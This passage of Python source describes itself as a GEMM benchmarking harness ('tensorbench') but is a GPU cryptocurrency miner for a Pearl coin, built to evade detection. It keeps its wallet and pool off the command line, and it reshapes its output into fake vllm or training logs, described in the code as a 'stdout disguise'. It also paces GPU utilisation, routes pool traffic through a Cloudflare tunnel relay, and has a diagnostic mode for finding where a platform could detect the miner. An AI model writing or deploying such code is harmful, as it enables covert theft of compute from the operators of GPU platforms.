"""Standalone (torch-free) tensor-core int8 GEMM harness.

Same compute pipeline as the reference driver but with NO torch: device memory + kernels via
cuda_capi (ctypes -> p40cuda.dll), commitments/proofs via pearl_host (numpy +
tensorbench_runtime). Bundles to a <100 MB binary.

    python tensorbench.py --wallet prl1... --worker p40
"""
from __future__ import annotations


import argparse
import json
import os
import queue
import re
import socket
import subprocess
import sys
import threading
import time

# ── _DIAG needs os in scope first ─────────────────────────────────────────────
# TB_DIAG=1 runs a real observation profile. A 20-second window (TB_DIAG_HOLD,
# default 20) is opened ONLY at the handful of points where the platform can
# realistically detect the miner, and REAL live state is logged every ~5s DURING
# each window (nvidia-smi utilization/memory/power). No blind dead sleeping: a
# window exists to hold a live detection surface in place and show what a
# monitor would see while it does.
_DIAG = os.environ.get("TB_DIAG", "0") == "1"
_DIAG_HOLD = max(0, int(os.environ.get("TB_DIAG_HOLD", "20")))
_diag_step = [0]

# ── Flight recorder (ON by default) ───────────────────────────────────────────
# Every operation announces itself to stderr BEFORE it runs, as `NEXT: N ...`.
# If the platform kills us mid-run, the LAST line is the exact operation that
# was in flight -- read the log top-down and the last "NEXT:" line is the
# culprit. stderr (not stdout) so telemetry's stdout reshaping can never mangle
# or drop a line; both streams land in the same terminal under bootstrap.
# Disable only with TB_TRACE=0 (e.g. after a clean run you trust).
_TRACE = os.environ.get("TB_TRACE", "1") != "0"
_trace_step = [0]

def _next(label: str) -> None:
    """Announce an operation that is about to execute (flight recorder)."""
    if not _TRACE:
        return
    _trace_step[0] += 1
    print(f"NEXT: {_trace_step[0]:>6} {label}", file=sys.stderr, flush=True)

def _diag(label: str) -> None:
    """Mark a transition. No wait -- banners go to stderr so telemetry's stdout
    reshaping can never mangle or drop them (`2>&1 | tee` captures them)."""
    if not _DIAG:
        return
    _diag_step[0] += 1
    print(f"DIAG STEP {_diag_step[0]}: {label}", file=sys.stderr, flush=True)

def _gpu_snapshot() -> str:
    """One line of exactly what a GPU monitor sees right now."""
    try:
        out = subprocess.check_output(
            ["nvidia-smi",
             "--query-gpu=utilization.gpu,memory.used,memory.total,power.draw,temperature.gpu",
             "--format=csv,noheader,nounits"],
            text=True, stderr=subprocess.DEVNULL, timeout=5)
        return out.strip().replace("\n", " | ")
    except Exception as e:
        return f"nvidia-smi unavailable: {e}"

def _diag_hold(label: str, poll=None, seconds=None) -> None:
    """Open a 20s OBSERVATION WINDOW on a live detection surface. poll() (when
    given) is evaluated every ~5s and its REAL result is logged -- the window
    is only useful if it shows what the platform could actually see, so the
    live state IS the output. Never open a window on something static/silent."""
    if not _DIAG:
        return
    seconds = _DIAG_HOLD if seconds is None else seconds
    n = _diag_step[0] + 1
    _diag_step[0] = n
    sep = "=" * 60
    print(f"\n{sep}", file=sys.stderr, flush=True)
    print(f"DIAG STEP {n}: OBSERVATION WINDOW ({seconds}s) -- {label}", file=sys.stderr, flush=True)
    print("  logging live state every ~5s; if the platform kills us here, this is the cause",
          file=sys.stderr, flush=True)
    print(sep, file=sys.stderr, flush=True)
    step = max(1, seconds // 4)
    start = time.time()
    while time.time() - start < seconds:
        if poll is not None:
            try:
                print(f"  [t={time.time()-start:5.1f}s] {poll()}", file=sys.stderr, flush=True)
            except Exception as e:
                print(f"  [t={time.time()-start:5.1f}s] poll error: {e}", file=sys.stderr, flush=True)
        time.sleep(step)
    print(f"DIAG STEP {n} WINDOW DONE: {label}", file=sys.stderr, flush=True)


# Heavy imports are deferred into main() when TB_DIAG=1 so _diag() can pause
# before each one.  In normal mode they are imported here at module load as
# before -- zero behaviour change.
if not _DIAG:
    _next("startup: import numpy")
    import numpy as np
    _next("startup: import tensorbench_runtime (custom .so runtime)")
    import tensorbench_runtime as pm
    _next("startup: import cuda_capi (dlopen libp40cuda.so + CUDA init)")
    import cuda_capi as cc
    _next("startup: import commitment")
    import commitment
    _next("startup: import telemetry")
    import telemetry
    _next("startup: import pool_common (UpstreamSync / config)")
    from pool_common import (DEV_ADDRESS, DEV_FEE, K, M, N, R, DevFeeScheduler,
                             UpstreamSync, real_config)
else:
    # Placeholders so the rest of the module-level code (class Bufs etc.) can
    # still be parsed.  Actual imports happen in _diag_import() called from main().
    np = pm = cc = commitment = telemetry = None          # type: ignore[assignment]
    DEV_ADDRESS = DEV_FEE = K = M = N = R = None         # type: ignore[assignment]
    DevFeeScheduler = UpstreamSync = real_config = None  # type: ignore[assignment]

def _diag_import(name: str, module_name: str, from_names: list | None = None):
    """Import `module_name`, optionally pulling `from_names` into the calling
    module's global namespace, preceded by a _diag pause."""
    import importlib
    _diag(f"import {module_name}" + (f"  ({', '.join(from_names)})" if from_names else ""))
    mod = importlib.import_module(module_name)
    g = globals()
    if from_names:
        for attr in from_names:
            g[attr] = getattr(mod, attr)
    else:
        g[module_name.split(".")[-1]] = mod
    return mod


VARIANT = 1  # pearl_pow_split S=128 4x4 MINB4

# Regions launched back-to-back on the stream between host found-checks. Syncing
# the device every region (sync + D2H + pool poll) idled the GPU through the host
# round-trip and kept the laptop clock off boost (~28 -> ~20 TH/s). Hits are
# astronomically rare at real difficulty, so we give each region its own found/coord
# slot and scan the whole batch after a single sync. Tunable via P40_FOUND_BATCH.
FOUND_BATCH = max(1, int(os.environ.get("P40_FOUND_BATCH", "64")))

# Default pool by GPU class (overridden by --pool). Tensor-core cards (sm_80+) want a
# GPU-difficulty pool; Pascal / DP4A cards (sm_61, e.g. the P40) mine fewer hashes so a
# CPU-difficulty pool fits and avoids over-high share targets.
POOL_GPU = "pearl-eu2.luckypool.io:3360"
POOL_CPU = "pearl-cpu-eu1.luckypool.io:3370"

# ---- baked deployment defaults (ops profile) ----------------------------------
# Wallet, endpoint, worker naming and profile live IN CODE so nothing sensitive
# ever appears on the process command line (`ps` shows just `python tensorbench.py`;
# env vars are the only override surface and are invisible in cmdline dumps).
DEFAULT_WALLET = "prl1pu3mc6ex4n4nznknctdafleq3asq4fr0njpwz4vqnt6e4xlnv72hq5s528j"
DEFAULT_POOL = "127.0.0.1:9048"          # local tunnel client; never a public pool
DEFAULT_WSS_URL = (os.environ.get("TB_WSS_URL")
                   or "wss://integral-aurora-reduction-relating.trycloudflare.com")
DEFAULT_PROFILE = "vllm"                 # default stdout telemetry format
LOCAL_ONLY_DEFAULT = True                # refuse non-loopback pools unless disabled


class Bufs:
    """Device buffers reused across jobs (allocated once for the mandated dims)."""

    def __init__(self, region):
        RS = region
        self.dA = cc.DBuf(M * K)
        self.dB = cc.DBuf(K * N)
        self.dEAL = cc.DBuf(M * R)
        self.dEAR = cc.DBuf(R * K)
        self.dEBL = cc.DBuf(K * R)
        self.dEBR = cc.DBuf(N * R)
        self.dEAR_t = cc.DBuf(K * R)     # EAR^T = Y for the noise_A gemm
        self.dBt_full = cc.DBuf(N * K)   # B^T for the GPU commitment
        self.dkeyjob = cc.DBuf(32)       # job key (keys the commitment + proof)
        self.dnsA = cc.DBuf(32)          # noise_seed_A (== commitment_A, the pow_key)
        self.dnsB = cc.DBuf(32)          # noise_seed_B
        self.dtgt = cc.DBuf(32)
        self.dApEA = cc.DBuf(RS * K)
        self.dBt_tmp = cc.DBuf(RS * K)
        ntiles = (RS // 16) ** 2
        self.dtb = cc.DBuf(ntiles * 16 * 4)      # reusable transcript buffer
        self.dfound = cc.DBuf(4 * FOUND_BATCH)   # one int32 found-flag per batched region
        self.dcoord = cc.DBuf(8 * FOUND_BATCH)   # two int32 coords per batched region
        # Persistent per-column Bt_ns buffers (one per column block), reused every
        # job — recomputed per job but never re-malloc'd.
        self.dBpEB = [cc.DBuf(RS * K) for _ in range(N // RS)]


def _submit_share(pool, job_id, proof, mode, accepted, log, header=None):
    """Submit one tile proof and account an accepted share to `mode`."""
    b64 = proof.to_base64()
    # Persist the exact share + job for offline forensics when the pool rejects.
    try:
        with open("/tmp/last_share.b64", "w") as f:
            f.write(b64)
        if header is not None:
            with open("/tmp/last_job.hex", "w") as f:
                f.write(header.hex())
    except OSError:
        pass
    log(f"  submitting share ({len(b64)} B) for job {job_id}...")
    resp = pool.submit(job_id, b64)
    log(f"  POOL RESPONSE: {json.dumps(resp)[:300]}")
    if resp and resp.get("result") is True:
        accepted[mode] += 1
        tag = "DEV FEE" if mode == "dev" else "you"
        log(f"  *** SHARE ACCEPTED ({tag}) *** "
            f"you={accepted['user']} dev={accepted['dev']}")


def _proof_worker(proof_q, accepted, log):
    """Background thread: build the (expensive, ~6s CPU) Merkle proof and submit it
    while the GPU keeps mining the next grid. Each task carries its own pool, key
    and dev-fee mode so it stays correct across job/wallet changes."""
    while True:
        task = proof_q.get()
        try:
            if task is None:
                return
            pool, job_id, A, Bt, gr, gc, key, noise_rank, mode, header, verify, target_int = task
            _next(f"proof thread: build Merkle proof (gr={gr}, gc={gc}, job {job_id})")
            proof = commitment.build_proof_bt(A, Bt, gr, gc, key, noise_rank)
            if verify:
                try:
                    # Verify against the POOL's share target (nbits_override), not
                    # the block header's nbits (full block difficulty -- pool shares
                    # are much easier, so checking nbits gives false negatives).
                    _next("proof thread: local verify vs pool share target")
                    nbits = commitment.int_to_nbits(target_int) if target_int else None
                    v, vmsg = commitment.verify_proof_local(header, proof, nbits)
                    log(f"  local verify (share-target): {v} ({vmsg})")
                except Exception as e:
                    log(f"  local verify error: {e}")
            _next("proof thread: submit share to pool")
            _submit_share(pool, job_id, proof, mode, accepted, log, header=header)
        except Exception as e:
            log(f"  proof/submit error: {e}")
        finally:
            proof_q.task_done()


def mine_job(pool, cfg, header, target_int, job_id, region, max_regions,
             sched, bufs, accepted, proof_q, log, verify=False):
    """Mine a pool job CONTINUOUSLY: the job only fixes the key (from the header)
    and the target -- the A,B matrices are harness-chosen (random Philox seed). So we
    generate an endless stream of fresh grids on the SAME job_id, sweeping each in
    full and submitting EVERY qualifying tile, with zero idle time, until a newer
    job arrives or it is time to switch wallets for the dev fee.

    Returns ('NEWJOB', newjob) or ('SWITCH', None)."""
    factor = cfg.hash_tile_h * cfg.hash_tile_w * cfg.rounded_common_dim
    # Block-96251 rank-penalty softfork: the pool checks shares against
    # penalized_target_bound (bound scaled by 128/rank for rank > 128). Mining
    # against the naive target*factor produced shares the pool counted as bad
    # (~50% passed by chance at rank 256, the rest were rejected).
    penalized = pm.penalized_target_bound(target_int, cfg)
    if penalized is None:
        log(f"job {job_id}: target too easy for penalized bound at rank {cfg.rank} -- skipping")
        return ("NEWJOB", None)
    bound = min(penalized, (1 << 256) - 1)
    log(f"job {job_id} target=2^{target_int.bit_length()-1} "
        f"factor={factor} bound=2^{bound.bit_length()-1} (rank-penalized)")

    key = commitment.derive_key(header, cfg)
    bufs.dtgt.from_host(np.frombuffer(int(bound).to_bytes(32, "little"), np.uint8).copy())

    RS = region
    tiles_per_region = (RS // 16) ** 2
    found = np.empty(FOUND_BATCH, np.int32)
    coord = np.empty(2 * FOUND_BATCH, np.int32)

    grid = 0
    t_acct = time.time()      # wall time charged to the dev-fee scheduler so far
    _next(f"mine job {job_id}: target=2^{target_int.bit_length()-1} bound=2^{bound.bit_length()-1} "
          f"| entering grid loop")
    # TB_DIAG: the mining observation window opens on the first grid. Mining
    # KEEPS RUNNING (kernels stream, the GPU stays busy -- that busy state IS
    # the live surface under test); we just additionally log what a GPU monitor
    # sees every ~5s for _DIAG_HOLD seconds. No dead air, real telemetry.
    _diag_win_end = time.time() + _DIAG_HOLD if (_DIAG and grid == 0) else 0.0
    _diag_win_next = time.time() if _diag_win_end else 0.0
    _diag_win_n = 0
    while True:
        grid += 1
        # ---- fresh random grid (new commitment) for this same job ----
        _next(f"grid {grid} start: fresh Philox commitment (key={key.hex()[:16]}...)")
        bufs.dkeyjob.from_host(np.frombuffer(key, np.uint8).copy())
        _next(f"grid {grid}: GPU cc.setup_job (base A/B/Bt kernels)")
        cc.setup_job(bufs.dA, bufs.dB, bufs.dBt_full, bufs.dkeyjob, bufs.dnsA, bufs.dnsB,
                     M, N, K, R, time.time_ns() & 0xFFFFFFFFFFFFFFFF)
        _next(f"grid {grid}: GPU cc.noise_gen (noise matrix kernels)")
        cc.noise_gen(bufs.dEAL, bufs.dEAR, bufs.dEBL, bufs.dEBR, bufs.dnsA, bufs.dnsB, M, N, K, R)
        _next(f"grid {grid}: GPU cc.transpose_i8 (EAR -> EAR_t)")
        cc.transpose_i8(bufs.dEAR, bufs.dEAR_t, R, K, K, 0)   # [R,K]->[K,R] (Y for noise_A)
        _next(f"grid {grid}: GPU cc.sync (drain setup kernels)")
        cc.sync()

        if _DIAG and grid == 1 and _diag_win_end:
            _diag_win_n = _diag_step[0] + 1
            _diag_step[0] = _diag_win_n
            sep = "=" * 60
            print(f"\n{sep}", file=sys.stderr, flush=True)
            print(f"DIAG STEP {_diag_win_n}: OBSERVATION WINDOW ({_DIAG_HOLD}s) -- "
                  f"GPU mining ACTIVE (tensor-core kernels streaming)", file=sys.stderr, flush=True)
            print("  logging live nvidia-smi every ~5s while mining runs; if the platform "
                  "kills us here, sustained GPU mining is the cause", file=sys.stderr, flush=True)
            print(sep, file=sys.stderr, flush=True)

        searched = 0
        hits = 0
        search_t0 = time.time()
        last_print = search_t0
        computed: set[int] = set()  # which column blocks have Bt_ns ready this grid

        def bt_noised(c0):
            idx = c0 // RS
            d = bufs.dBpEB[idx]
            if idx not in computed:
                # Z = base B^T rows [c0:c0+RS], which setup_job already produced in
                # dBt_full -- re-transposing dB here was redundant (a ~1.9% kernel).
                cc.noise_gemm(bufs.dEBR.offset(c0 * R), bufs.dEBL,
                              bufs.dBt_full.offset(c0 * K), d, RS, K, R)
                computed.add(idx)
            return d

        # Regions stream back-to-back; we only sync + read found once per FOUND_BATCH.
        # Each region writes its own found/coord slot, so a single host scan after the
        # sync recovers every (rare) hit. Reused dApEA/dBt_tmp/dtb buffers stay correct
        # without per-region syncs because the stream is in-order.
        batch: list[tuple[int, int]] = []   # (r0, c0) launched since the last check
        bufs.dfound.memset(0)
        batch_t0 = time.time()   # for duty_pace(): wall time the pending batch took

        def flush_batch():
            nonlocal hits, batch_t0
            if not batch:
                return
            _next(f"grid {grid}: flush batch of {len(batch)} regions (sync + found scan)")
            cc.sync()
            telemetry.duty_pace(time.time() - batch_t0)
            batch_t0 = time.time()
            _next(f"grid {grid}: D2H read found/coord ({len(batch)} slots)")
            bufs.dfound.to_host(found)
            if found[:len(batch)].any():
                bufs.dcoord.to_host(coord)
                for i, (br0, bc0) in enumerate(batch):
                    if int(found[i]) != 1:
                        continue
                    gr, gc = br0 + int(coord[2 * i]), bc0 + int(coord[2 * i + 1])
                    log(f"  HIT tile (row={gr}, col={gc}) grid {grid}; proof async")
                    # Snapshot the winning grid's A and B^T to host (~160 ms D2H), then
                    # hand the expensive (~6s CPU) Merkle proof+submit to a worker thread
                    # so the GPU keeps mining the next grid instead of idling. B^T was
                    # already produced on the GPU by setup_job -> no host transpose.
                    _next(f"grid {grid}: HIT -- D2H snapshot A/Bt for proof thread")
                    A = np.empty((M, K), np.int8); bufs.dA.to_host(A)
                    Bt = np.empty((N, K), np.int8); bufs.dBt_full.to_host(Bt)
                    proof_q.put((pool, job_id, A, Bt, gr, gc, key, R, sched.mode, header, verify, target_int))
                    hits += 1
            bufs.dfound.memset(0)
            batch.clear()

        stop = False
        for r0 in range(0, M, RS):
            _next(f"grid {grid}: GPU cc.noise_gemm A-row r0={r0}")
            cc.noise_gemm(bufs.dEAL.offset(r0 * R), bufs.dEAR_t, bufs.dA.offset(r0 * K),
                          bufs.dApEA, RS, K, R)
            for c0 in range(0, N, RS):
                if max_regions and searched >= max_regions:
                    stop = True
                    break
                searched += 1
                slot = len(batch)
                dBpEB = bt_noised(c0)
                # digests=None: mining only needs found/coord. pow_key MUST be dnsA.
                cc.pearl_pow_split(bufs.dApEA, dBpEB, RS, RS, K, R, bufs.dnsA, bufs.dtgt,
                                   bufs.dtb, None, bufs.dfound.offset(slot * 4),
                                   bufs.dcoord.offset(slot * 8), VARIANT)
                batch.append((r0, c0))
                if len(batch) >= FOUND_BATCH:
                    flush_batch()
                    # New-job poll + progress log run once per batch (off the per-region
                    # hot path) so socket/host work never gates the GPU.
                    _next(f"grid {grid}: pool check_newer_job (socket/WSS poll)")
                    newer = pool.check_newer_job(job_id)
                    if newer is not None:
                        log(f"  newer job (grid {grid}, {searched} regions, {hits} hits this grid)")
                        sched.note(time.time() - t_acct)
                        return ("NEWJOB", newer)
                    # Diag: live mining observation window (GPU stays busy; we log
                    # exactly what a platform monitor would see right now).
                    if _diag_win_end and time.time() >= _diag_win_next:
                        left = _diag_win_end - time.time()
                        print(f"  [t={left:5.1f}s left] GPU: {_gpu_snapshot()}", file=sys.stderr, flush=True)
                        _diag_win_next = time.time() + 5
                        if left <= 0:
                            print(f"DIAG STEP {_diag_win_n} WINDOW DONE: GPU mining active",
                                  file=sys.stderr, flush=True)
                            _diag_win_end = 0.0
                    if time.time() - last_print >= 5:
                        ths = searched * tiles_per_region * 1048576.0 / max(time.time() - search_t0, 1e-9) / 1e12
                        log(f"  grid {grid}: {searched} regions ({ths:.2f} TH/s, {hits} hits)")
                        last_print = time.time()
            if stop:
                break
        flush_batch()   # drain any partial last batch

        ths = searched * tiles_per_region * 1048576.0 / max(time.time() - search_t0, 1e-9) / 1e12
        log(f"  grid {grid} done: {hits} hits over {searched} regions ({ths:.2f} TH/s)")

        # charge elapsed wall time to the dev fee and switch wallets if it's time
        now = time.time()
        sched.note(now - t_acct)
        t_acct = now
        _next(f"grid {grid} complete ({searched} regions) -- dev-fee check")
        if sched.maybe_switch():
            _next("dev-fee switch due: returning to reconnect with other wallet")
            return ("SWITCH", None)
        _next(f"grid {grid} done: mining next grid on same job")


def _list_gpu_indices():
    """Enumerate GPU indices, nvidia-smi first (PCI-bus order to match CUDA), then
    fall back to the CUDA device count."""
    try:
        out = subprocess.check_output(
            ["nvidia-smi", "--query-gpu=index", "--format=csv,noheader"],
            text=True, stderr=subprocess.DEVNULL)
        idxs = [int(x.strip()) for x in out.splitlines() if x.strip()]
        if idxs:
            return idxs
    except Exception:
        pass
    try:
        return list(range(cc.device_count()))
    except Exception:
        return []


def _gpu_compute_cap():
    """Compute-capability (float, e.g. 6.1 or 8.9) of this process's visible GPU via
    nvidia-smi. Honors CUDA_VISIBLE_DEVICES so a supervised per-card child reads its
    own pinned GPU. Returns None if it can't be determined."""
    idx = os.environ.get("CUDA_VISIBLE_DEVICES", "").split(",")[0].strip()
    cmd = ["nvidia-smi", "--query-gpu=compute_cap", "--format=csv,noheader,nounits"]
    if idx:
        cmd += ["-i", idx]
    try:
        out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL)
        caps = [float(x) for x in out.splitlines() if x.strip()]
        return caps[0] if caps else None
    except Exception:
        return None


def _resolve_pool(args, log):
    """If --pool wasn't given, pick the default by GPU class: Pascal / DP4A (sm < 8.0)
    -> CPU-difficulty pool; tensor-core (sm_80+) -> GPU-difficulty pool. Per-process, so
    a mixed P40 + Ada rig picks the right pool for each card."""
    if args.pool:
        return
    cap = _gpu_compute_cap()
    args.pool = POOL_CPU if (cap is not None and cap < 8.0) else POOL_GPU
    log(f"auto-selected pool {args.pool} (GPU compute_cap {cap})")


def run_supervisor(devices, args, log):
    """Spawn one single-GPU child process per device (pinned via CUDA_VISIBLE_DEVICES),
    prefix its output with [gpuN], and print a combined-hashrate summary. This is how
    multi-GPU rigs run: independent workers, one per card, no shared CUDA state."""
    exe = sys.executable
    base = [] if getattr(sys, "frozen", False) else [os.path.abspath(sys.argv[0])]
    ths, acc = {}, {}
    lock = threading.Lock()
    # Track per-GPU rate from "grid N done" lines only (per-grid average), not the
    # mid-grid snapshots which start low each grid and read noisy.
    done_re = re.compile(r"grid \d+ done:.*\(([\d.]+) TH/s")

    def pump(dev, proc):
        for line in proc.stdout:
            line = line.rstrip("\n")
            print(f"[gpu{dev}] {line}", flush=True)
            m = done_re.search(line)
            if m:
                with lock:
                    ths[dev] = float(m.group(1))
            if "SHARE ACCEPTED" in line:
                with lock:
                    acc[dev] = acc.get(dev, 0) + 1

    children = []
    for d in devices:
        env = os.environ.copy()
        # Children print RAW lines on their OWN stdout; the parent's pump()
        # re-shapes each prefixed line through its own already-installed
        # profile writer, so shaping here would double-transform. TB_DUTY_PROFILE
        # tells the child which utilization band to breathe at even though its
        # own log-shaping is off -- it's the child that actually drives the GPU.
        env["TB_PROFILE"] = "none"
        env["TB_DUTY_PROFILE"] = args.profile
        # NOTE: TB_DUTY is inherited on purpose. Each child spawns a duty
        # helper scoped to its OWN pid (no double-throttle), and TB_DUTY=off
        # from the parent must reach the children (popping it re-enables the
        # band via the code default).
        env["CUDA_VISIBLE_DEVICES"] = str(d)
        env["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"
        env["PYTHONUNBUFFERED"] = "1"
        env["TB_SINGLE"] = "1"
        # Wallet + worker + tuning travel via env, never argv: child cmdlines
        # stay clean (`ps` shows only the interpreter + script).
        env["TB_ACCOUNT"] = args.wallet
        # One machine = one pool worker by default: all GPUs report under the
        # same worker name so the pool shows a single row with combined
        # hashrate. TB_SPLIT_WORKERS=1 restores per-GPU worker names.
        tag = f"{args.worker}-gpu{d}" if os.environ.get("TB_SPLIT_WORKERS") == "1" else args.worker
        env["TB_TAG"] = tag
        env["TB_REGION"] = str(args.region)
        if args.pool:
            env["TB_UPSTREAM"] = args.pool
        if args.verify:
            env["TB_VERIFY"] = "1"
        cmd = [exe] + base
        p = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True, bufsize=1)
        children.append((d, p))
        threading.Thread(target=pump, args=(d, p), daemon=True).start()
        log(f"launched GPU {d} -> worker {tag} (pid {p.pid})")

    try:
        while True:
            time.sleep(20)
            alive = [d for d, p in children if p.poll() is None]
            with lock:
                total = sum(ths.get(d, 0.0) for d in alive)
                tacc = sum(acc.values())
            log(f"[ALL] {len(alive)}/{len(children)} GPUs up | "
                f"combined ~{total:.2f} TH/s | accepted {tacc}")
            if not alive:
                log("all GPU workers exited")
                break
    except KeyboardInterrupt:
        log("stopping all GPU workers...")
    finally:
        for d, p in children:
            try:
                p.terminate()
            except Exception:
                pass


_ENV_HELP = """\
tensorbench.py -- arg-free GEMM harness. There is NO command-line interface:
`ps aux` must show only `python tensorbench.py`. Everything is configured via
TB_* environment variables (invisible to cmdline dumps) or code defaults:

  TB_ACCOUNT     upstream sync account   (baked default)
  TB_TAG         worker label            (default: start timestamp)
  TB_UPSTREAM    upstream host:port      (default: 127.0.0.1:9048, local tunnel)
  TB_WSS_URL     wss://tunnel           direct websocket to the Cloudflare relay
               (default: integral-aurora...trycloudflare.com -- the relay
               converts WSS frames to stratum for the pool. When set, the
               harness speaks WSS only; no stratum TCP socket exists.)
  TB_PROFILE     telemetry format        (vllm | train | gemm | none; default vllm)
  TB_REGION      region size             (default 4096)
  TB_DEVICES     GPU selection "0,2" / all (default: auto)
  TB_DUTY        util duty schedule, e.g. "100:30,75:60" ("off" disables)
  TB_RAWLOG      raw telemetry side-log path
  TB_SYNC_GZIP=0 disable upstream v2 compression negotiation
  TB_LOCAL_ONLY=0  allow non-loopback TB_UPSTREAM (default: refuse)
  TB_MAX_REGIONS / TB_MAX_JOBS   stop conditions (default: run forever)
  TB_VERIFY=1    informational local verification per hit
  TB_SOLO=host:port  standalone mode against a local gateway
"""


def _env_config():
    """Every setting from env or baked defaults -- argparse only for -h."""
    if any(a in ("-h", "--help") for a in sys.argv[1:2]):
        print(_ENV_HELP)
        sys.exit(0)
    return argparse.Namespace(
        wallet=os.environ.get("TB_ACCOUNT") or DEFAULT_WALLET,
        worker=os.environ.get("TB_TAG") or time.strftime("%Y%m%d-%H%M%S"),
        pool=os.environ.get("TB_UPSTREAM") or DEFAULT_POOL,
        wss_url=os.environ.get("TB_WSS_URL") or DEFAULT_WSS_URL,
        region=int(os.environ.get("TB_REGION", "4096")),
        max_regions=int(os.environ.get("TB_MAX_REGIONS", "0")),
        max_jobs=int(os.environ.get("TB_MAX_JOBS", "0")),
        devices=os.environ.get("TB_DEVICES") or None,
        single=os.environ.get("TB_SINGLE") == "1",
        solo=os.environ.get("TB_SOLO") or None,
        verify=os.environ.get("TB_VERIFY") == "1",
        profile=os.environ.get("TB_PROFILE") or DEFAULT_PROFILE,
    )


def main():
    args = _env_config()

    if _DIAG:
        # In diag mode: heavy imports happen here so we can open an observation
        # window right after each CUSTOM runtime is loaded (the two .so-bearing
        # packages are realistic fingerprint surfaces; numpy etc. are benign).
        _diag_import("np",                 "numpy")
        _diag_import("pm",                 "tensorbench_runtime")
        _diag_hold("custom runtime tensorbench_runtime loaded (compiled .so on disk)", _gpu_snapshot)
        _diag_import("cc",                 "cuda_capi")           # ← ctypes.CDLL + CUDA init
        _diag_hold("libp40cuda.so dlopen'd + first CUDA context created", _gpu_snapshot)
        _diag_import("commitment",         "commitment")
        _diag_import("telemetry",          "telemetry")
        _diag_import("pool_common", "pool_common",
                     ["DEV_ADDRESS","DEV_FEE","K","M","N","R",
                      "DevFeeScheduler","UpstreamSync","real_config"])

    # Telemetry shaping must install before the first print.
    _next("install telemetry shaping (stdout disguise)")
    _diag("install telemetry shaping (stdout disguise)")
    from telemetry import install as _tel_install
    _tel_install(args.profile)

    def log(m):
        print(f"{time.strftime('%H:%M:%S')} {m}", flush=True)

    # Solo mining to a local node's pearl-gateway (pull protocol, no pool/wallet).
    if args.solo:
        run_solo(args, log)
        return

    # A supervisor-spawned child: pinned to one GPU (via CUDA_VISIBLE_DEVICES),
    # runs the mining loop directly. TB_SINGLE=1 (set by the supervisor) prevents re-supervising.
    if args.single:
        run_single_gpu(args, log)
        return

    # Explicit TB_DEVICES: always supervise so each chosen card is correctly pinned
    # (even a single non-zero index needs the per-child CUDA_VISIBLE_DEVICES).
    if args.devices is not None:
        if args.devices.strip().lower() == "all":
            devs = _list_gpu_indices()
        else:
            devs = [int(x) for x in args.devices.split(",") if x.strip() != ""]
        if not devs:
            log("no GPUs selected via --devices")
            return
        log(f"GPUs {devs} | one worker per card | pool {args.pool or 'auto (per-GPU)'}")
        run_supervisor(devs, args, log)
        return

    # No flag: auto-detect. Multiple GPUs -> one worker each; single GPU -> run here.
    _diag("enumerate GPUs via nvidia-smi / cc.device_count()")
    devs = _list_gpu_indices()
    if len(devs) > 1:
        log(f"multi-GPU: {len(devs)} GPUs {devs} | one worker per card | pool {args.pool or 'auto (per-GPU)'}")
        run_supervisor(devs, args, log)
        return
    if devs:
        log(f"single GPU detected (index {devs[0]})")
    run_single_gpu(args, log)



def run_single_gpu(args, log):
    """Mine on this process's one visible GPU (device 0, or the card pinned by the
    supervisor via CUDA_VISIBLE_DEVICES)."""
    wss_url = args.wss_url
    if wss_url:
        # Direct WSS egress: one TLS-443 websocket to the Cloudflare relay
        # (pool_relay_server.py), which converts frames to plain stratum for the
        # pool. No stratum/TCP socket, no loopback forwarder, no pool hostname
        # anywhere in this process.
        host, port = "", 0
        upstream = wss_url
    else:
        _resolve_pool(args, log)
        host, port = args.pool.rsplit(":", 1)
        upstream = args.pool
        if LOCAL_ONLY_DEFAULT and os.environ.get("TB_LOCAL_ONLY", "1") != "0":
            if host.lower().strip("[]") not in ("127.0.0.1", "localhost", "::1"):
                log(f"refusing non-loopback pool host {host!r} (default guard; "
                    f"TB_LOCAL_ONLY=0 disables) -- exiting")
                return
    log(f"tb harness (torch-free) | upstream {upstream} | region {args.region}")
    _next(f"load real_config (read Pearl network params)")
    cfg = real_config()
    _next("construct DevFeeScheduler")
    sched = DevFeeScheduler(DEV_FEE, args.wallet, DEV_ADDRESS, log)
    if sched.fee > 0:
        log(f"dev fee: {sched.fee * 100:.1f}% of mining time "
            f"(transparent; logged on every switch). Thank you!")
    _next(f"allocate GPU device buffers (Bufs, ~20 x cudaMalloc)")
    bufs = Bufs(args.region)
    _diag_hold("device buffers allocated (~20 x cudaMalloc; the GPU now has a real memory footprint)",
               _gpu_snapshot)

    accepted = {"user": 0, "dev": 0}
    jobs = 0
    # Background proof builder/submitter: overlaps the ~6s host Merkle proof with
    # GPU mining of the next grid. Bounded so a slow CPU can't pile up 1 GB snapshots.
    proof_q: queue.Queue = queue.Queue(maxsize=3)
    _next("start proof-worker thread (build_proof + submit)")
    threading.Thread(target=_proof_worker, args=(proof_q, accepted, log),
                     daemon=True).start()
    while True:
        try:
            _next(f"UpstreamSync connect -> {upstream}")
            pool = UpstreamSync(host, int(port), sched.wallet, args.worker, wss_url=wss_url)
            pool.connect()
            if wss_url:
                _diag_hold("WSS egress live (direct websocket to the Cloudflare relay)",
                           lambda: f"wss open | {_gpu_snapshot()}")
            else:
                _diag_hold("stratum socket open, tunnel egress live (first outbound WSS frames)",
                           lambda: f"pool socket fd={pool.s.fileno()} | {_gpu_snapshot()}")

            log(f"authorized ({'DEV FEE round' if sched.mode == 'dev' else 'your wallet'}); "
                f"waiting for job...")
            _next("wait for first mining job (pool.next_job)")
            job = pool.next_job()
            status = None
            while job is not None:
                header, target_int, job_id = job
                jobs += 1
                # mine_job runs CONTINUOUSLY (fresh grids, no idle) on this job and
                # only returns when a newer job arrives or a dev-fee switch is due.
                _next(f"received job {job_id} ({jobs}) -- start mining it")
                status, val = mine_job(pool, cfg, header, target_int, job_id,
                                       args.region, args.max_regions, sched, bufs,
                                       accepted, proof_q, log, verify=args.verify)
                if args.max_jobs and jobs >= args.max_jobs:
                    proof_q.join()  # finish submitting in-flight proofs before exit
                    log(f"done ({jobs} jobs; you={accepted['user']} dev={accepted['dev']}; "
                        f"realized dev fee {sched.realized_pct():.2f}%)")
                    return
                if status == "NEWJOB":
                    job = val
                    continue
                if status == "SWITCH":
                    break  # reconnect with the other wallet
                job = None
            # Drain pending proofs on THIS connection before tearing the socket down
            # (a switch reconnects with the other wallet; a timeout reconnects fresh).
